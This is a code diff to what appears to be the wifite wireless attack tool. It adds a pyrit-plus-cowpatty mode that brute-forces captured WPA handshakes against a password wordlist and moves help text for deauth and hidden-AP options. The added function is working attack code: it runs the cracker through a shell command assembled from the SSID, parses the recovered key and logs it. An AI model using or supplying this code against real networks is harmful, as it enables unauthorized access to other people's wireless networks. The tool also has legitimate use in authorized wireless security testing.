@@ -45,7 +45,7 @@ except ImportError:
 	print '[!] unable to import tkinter -- GUI disabled'
 
 # current revision
-REVISION=67
+REVISION=68
 
 # default wireless interface (blank to prompt)
 # ex: wlan0, wlan1, rausb0
@@ -93,6 +93,8 @@ NO_HIDDEN_DEAUTH=False # when true, disables the option to send deauth packets t
                        # this can help uncloak invisible access points, but is laggy
 
 STRIP_HANDSHAKE=True # when true, strips handshake via pyrit (removes unnecessary packets from .cap file)
+
+CRACK_WITH_PYRIT=False # when true, uses pyrit and cowpatty to crack WPA handshakes
 
 # default channel to scan
 CHANNEL='0'  # 0 means attack all channels.
@@ -998,7 +1000,7 @@ def main():
 ############################################################################### aircrack warning
 def aircrack_warning():
 	required   =['airmon-ng','aircrack-ng','airodump-ng','aireplay-ng','packetforge-ng']
-	recommended=['macchanger','pyrit']
+	recommended=['macchanger','pyrit','cowpatty']
 	
 	req=''
 	rec=''
@@ -1067,7 +1069,8 @@ def handle_args(args):
 	global IFACE, WEP, WPA, CHANNEL, ESSID, DICT, WPA_MAXWAIT, WEP_MAXWAIT, STRIP_HANDSHAKE
 	global W, BLA, R, G, O, B, P, C, GR # colors
 	global WEP_ARP, WEP_CHOP, WEP_FRAG, WEP_P0841, TEMPDIR, EXIT_IF_NO_FAKEAUTH # wep attacks
-	global REVISION, THEFILE, CHANGE_MAC, ORIGINAL_MAC, ANONYMOUS_MAC, USING_XTERM, AUTOCRACK, TIMEWAITINGCLIENTS, SCAN_MAXWAIT
+	global REVISION, THEFILE, CHANGE_MAC, ORIGINAL_MAC, ANONYMOUS_MAC, USING_XTERM, AUTOCRACK
+	global TIMEWAITINGCLIENTS, SCAN_MAXWAIT, CRACK_WITH_PYRIT
 	
 	# first loop, finds '-no-color' in case the user doesn't want to see any color!
 	for a in args:
@@ -1277,6 +1280,11 @@ def handle_args(args):
 				subprocess.call(['rm','-rf',TEMPDIR])
 				sys.exit(0)
 			i=i+1
+		elif a == '-py' or a == '--pyrit':
+			# crack with pyrit
+			CRACK_WITH_PYRIT=True
+			print GR+'[+] '+W+'cracking with pyrit + cowpatty '+G+'enabled'+W
+			
 		elif a == '-pps' or a == '--pps':
 			try:
 				WEP_PPS=int(args[i+1])
@@ -1388,7 +1396,33 @@ def halp(full=False):
 		print '            \t is then changed back to its original address\n'
 	else:
 		print G+'  -anon\t   '+GR+'anonymizer: change to random mac address before attacking'
-		
+	# SSID DEAUTH
+	if full:
+		#-nod --no-deauth
+		print G+'  --no-deauth\t '+GR+'disables the deauthing of clients on hidden APs'
+		print   '             \t by default, wifite will deauth clients connected to hidden APs'
+		print   '             \t *wifite only deauths hidden SSID clients in FIXED CHANNEL MODE*\n'
+	else:
+		print G+'  -nod     '+GR+'do not deauth hidden SSIDs while scanning on a fixed channel'
+	#NO COLORS
+	if full:
+		print G+'  --no-color\t '+GR+'do not display annoying colors (use system colors)\n'
+	else:
+		print G+'  -nocolor '+GR+'do not use colored text (use system colors)'
+	#TWCLIENTS
+	if full:
+		print G+'  --timewaitingclients\t'+GR+'     e.g. --timewaitingclients 30'
+		print   '             \t set the time in seconds waiting for clients\n'
+	else:
+		print G+'  -twclients '+GR+'set the time in seconds waiting for clients'
+	#SCANWAIT
+        if full:
+		print G+'  --scan-wait\t'+GR+'     e.g. --scan-wait 20'
+		print   '             \t set the time in seconds to wait for targets\n'
+	else:
+		print G+'  -scanw     '+GR+'set the time in seconds to wait for targets\n'
+	
+	print GR+'\n  WPA SETTINGS'
 	#DICT
 	if full:
 		print G+'  -d, --dict\t'+GR+'     e.g. -d /pentest/passwords/wordlists/darkc0de.lst'
@@ -1415,6 +1449,15 @@ def halp(full=False):
 		print '         \t greatly reduces the size of handshkae cap files\n'
 	else:
 		print G+'  -nostrip '+GR+'strip WPA handshake from cap files (reduce .cap size)'
+        # crack using pyrit/cowpatty
+	if full:
+		print G+'  --pyrit\t'+GR+' use pyrit + cowpatty to crack WPA handshakes'
+		print '         \t passes hashes from pyrit to cowpatty'
+		print '         \t can be much faster (and more reliable) than aircrack-ng\n'
+	else:
+		print G+'  -py\t   '+GR+'crack WPA using pyrit + cowpatty'
+	
+	print GR+'\n  WEP SETTINGS'
 	#WEPWAIT
 	if full:
 		print G+'  --wep-wait\t'+GR+'     e.g. -wepw 10'
@@ -1456,37 +1499,13 @@ def halp(full=False):
 		print   '              \t the default is to stop the attack when fake-auth fails\n'
 	else:
 		print G+'  -f       '+GR+'force WEP attacks to continue if fake-authentication fails'
-	# SSID DEAUTH
-	if full:
-		#-nod --no-deauth
-		print G+'  --no-deauth\t '+GR+'disables the deauthing of clients on hidden APs'
-		print   '             \t by default, wifite will deauth clients connected to hidden APs'
-		print   '             \t *wifite only deauths hidden SSID clients in FIXED CHANNEL MODE*\n'
-	else:
-		print G+'  -nod     '+GR+'do not deauth hidden SSIDs while scanning on a fixed channel'
-	#NO COLORS
-	if full:
-		print G+'  --no-color\t '+GR+'do not display annoying colors (use system colors)\n'
-	else:
-		print G+'  -nocolor '+GR+'do not use colored text (use system colors)'
+	
 	#AUTOCRACK
 	if full:
 		print G+'  --autocrack\t'+GR+'     e.g. -autocrack 500'
 		print   '             \t set minimun quantity of ivs to start cracking\n'
 	else:
 		print G+'  -autocrack '+GR+'set minimun quantity of ivs to start cracking'
-	#TWCLIENTS
-	if full:
-		print G+'  --timewaitingclients\t'+GR+'     e.g. --timewaitingclients 30'
-		print   '             \t set the time in seconds waiting for clients\n'
-	else:
-		print G+'  -twclients '+GR+'set the time in seconds waiting for clients'
-	#SCANWAIT
-        if full:
-		print G+'  --scan-wait\t'+GR+'     e.g. --scan-wait 20'
-		print   '             \t set the time in seconds to wait for targets\n'
-	else:
-		print G+'  -scanw     '+GR+'set the time in seconds to wait for targets\n'
 	
 	print GR+'\n  FILTERS'
 	#ESSID
@@ -1657,13 +1676,23 @@ def wpa_crack(index):
 		i don't have a way to get the # of tries per second or total, so it just outputs "cracking" every 5 seconds
 		maybe it could do something else...
 	"""
-	global DICT, WPA_CRACK, TEMPDIR, CRACKED
+	
+	# check if we are going to crack with pyrit, and if so, if we even can.
+	if CRACK_WITH_PYRIT == True:
+		proc_pyrit = subprocess.Popen(['which','pyrit'],stdout=subprocess.PIPE)
+		if proc_pyrit.communicate()[0].strip() != '':
+			proc_cowpatty = subprocess.Popen(['which','cowpatty'],stdout=subprocess.PIPE)
+			if proc_cowpatty.communicate()[0].strip() != '':
+				wpa_crack_pyrit(index)
+				return
+	
+        global DICT, WPA_CRACK, TEMPDIR, CRACKED
 	
 	filename=WPA_CRACK[index][0]
 	ssid    =WPA_CRACK[index][1]
 	bssid   =WPA_CRACK[index][2]
-        
-	print GR+'['+sec2hms(0)+'] '+W+'started cracking WPA key for "'+G + ssid + W+'";',
+	
+	print GR+'['+sec2hms(0)+'] '+W+'started cracking WPA key for "'+G + ssid + W+'" using '+G+'aircrack-ng'+W+';',
 	
 	# calculate number of passwords we will try
 	proc_pmk=subprocess.Popen(['wc','-l',DICT], stdout=subprocess.PIPE, stderr=open(os.devnull,'w'))
@@ -1672,7 +1701,7 @@ def wpa_crack(index):
 		txt=txt.strip().split(' ')[0]
 		if txt != '':
 			total_pmks=int(txt.strip())+1
-			print 'using '+G+DICT+W+' ('+G + str(total_pmks) +' passwords'+W+')'
+			print GR+'\n['+sec2hms(0)+'] '+W+'using '+G+DICT+W+' ('+G + str(total_pmks) +' passwords'+W+')'
 	else:
 		total_pmks=0
 		print ''
@@ -1774,6 +1803,135 @@ def wpa_crack(index):
 	# remove the temp file
 	subprocess.call(['rm','-rf',TEMPDIR+'crackout.tmp'])
 
+def wpa_crack_pyrit(index):
+	global DICT, WPA_CRACK, TEMPDIR, CRACKED
+	
+	filename=WPA_CRACK[index][0]
+	ssid    =WPA_CRACK[index][1]
+	bssid   =WPA_CRACK[index][2]
+	
+        is_it_cracked = False
+        
+	print GR+'['+sec2hms(0)+'] '+W+'started cracking WPA key for "'+G + ssid + W+'" using '+G+'pyrit'+W+';',
+	
+	# calculate number of passwords we will try
+	proc_pmk=subprocess.Popen(['wc','-l',DICT], stdout=subprocess.PIPE, stderr=open(os.devnull,'w'))
+	txt=proc_pmk.communicate()[0]
+	if txt != None:
+		txt=txt.strip().split(' ')[0]
+		if txt != '':
+			total_pmks=int(txt.strip())+1
+			print GR+'\n['+sec2hms(0)+'] '+W+'using '+G+DICT+W+' ('+G + str(total_pmks) +' passwords'+W+')'
+	else:
+		total_pmks=0
+		print ''
+	
+	cracked=''
+	proc_crack=''
+	START_TIME=time.time()
+	
+	try:
+		subprocess.call(['rm','-rf',TEMPDIR+'crackout.tmp'])
+		time.sleep(0.1)
+		
+		cmd = 'pyrit -e "' + ssid + '" -i "' + DICT + '" -o - passthrough | ' + \
+		      'cowpatty -d - -r ' + filename + ' -s ' + ssid + \
+                      ' '+TEMPDIR+'crackout.tmp'
+                
+		#cmd = 'aircrack-ng -a 2 -w '+DICT+' -l '+TEMPDIR+'wpakey.txt '+filename+' >> '+TEMPDIR+'crackout.tmp'
+		proc_crack = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), shell=True)
+		
+		ks='0'
+		pmks='0'
+		while (proc_crack.poll() == None):
+			time.sleep(1)
+                        print '\r'+GR+'['+sec2hms(time.time() - START_TIME)+'] '+W+'cracking;',
+			f=open(TEMPDIR+'crackout.tmp')
+			txt=f.read()
+                        if txt != '' and txt != None:
+				# check for crack
+				passk = txt.find('The PSK is "')
+				if passk != -1:
+					# key found!
+					passk = passk + len('The PSK is "')
+					passk2 = txt.find('"', passk + 1)
+					thepass = txt[passk:passk2]
+					
+					print '\n'+GR+'['+sec2hms(time.time()-START_TIME)+'] '+G+'cracked "' + ssid + '"! the key is: "'+C+thepass+G+'"'
+					logit('cracked WPA key for "' + ssid + '" (' + bssid + '), the key is: "' + thepass + '"')
+					CRACKED += 1
+					is_it_cracked = True
+					break
+				
+				current=''
+				
+				# find the keys per second
+				last=txt.rfind('key no. ')
+				lastc = txt.find(':', last)
+				if last != -1:
+					current = txt[last+len('key no. '):lastc]
+					print G+str(current)+W+' keys tried;',
+					try:
+						curnum = int(current)
+						print G+str(curnum * 100 / total_pmks) + '%'+W,
+					except ValueError:
+						curnum = -1
+					
+					
+                        sys.stdout.flush()
+			
+			# wipe the aircrack output file (keep it from getting too big)
+		        subprocess.call('echo "" > '+TEMPDIR+'crackout.tmp',shell=True)
+		
+		f=open(TEMPDIR+'crackout.tmp')
+		txt=f.read()
+		if txt != '' and txt != None and is_it_cracked == False:
+			# check for crack
+			passk = txt.find('The PSK is "')
+			if passk != -1:
+				# key found!
+				passk = passk + len('The PSK is "')
+				passk2 = txt.find('"', passk + 1)
+				thepass = txt[passk:passk2]
+				
+				print '\n'+GR+'['+sec2hms(time.time()-START_TIME)+'] '+G+'cracked "' + ssid + '"! the key is: "'+C+thepass+G+'"'
+				logit('cracked WPA key for "' + ssid + '" (' + bssid + '), the key is: "' + thepass + '"')
+				CRACKED += 1
+				is_it_cracked = True
+		
+		if is_it_cracked == False:
+			print GR+'\n['+sec2hms(time.time()-START_TIME)+'] '+W+'wordlist crack complete; '+O+'WPA key for "' + ssid + '" was not found in the dictionary'
+		
+		print '\n'
+	except KeyboardInterrupt:
+		print R+'\n['+sec2hms(time.time()-START_TIME)+'] '+O+'cracking interrupted\n'+W
+		# check if there's other files to crack (i < len(WPA_CRACK))
+		# if there are, ask if they want to start cracking the next handshake, or exit
+		if index != len(WPA_CRACK) - 1:
+			# there are more handshakes to crack! prompt a menu...
+			menu= G+'   [c]ontinue cracking other handshakes ('+str(len(WPA_CRACK)-index-1)+' remaining)\n'
+			menu+=R+'   [e]xit the program completely'
+			
+			print GR+'\n[+] '+W+'please select a menu option below:'
+			print menu
+			print GR+'[+] '+W+'enter option ('+G+'c'+W+' or '+R+'e'+W+'):',
+			typed=raw_input()
+			if typed == 'e':
+				WPA_CRACK.append(['','',''])
+	
+	try:
+		os.kill(proc_crack.pid, signal.SIGTERM)
+	except OSError:
+		pass
+	except UnboundLocalError:
+		pass
+	
+        # kill pyrit (just in case)
+	subprocess.call(['killall','pyrit'], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
+	
+	# remove the temp file
+	subprocess.call(['rm','-rf',TEMPDIR+'crackout.tmp'])
+	
 ############################################################################### dict_check
 def dict_check():
 	""" checks if user has specified a dictionary
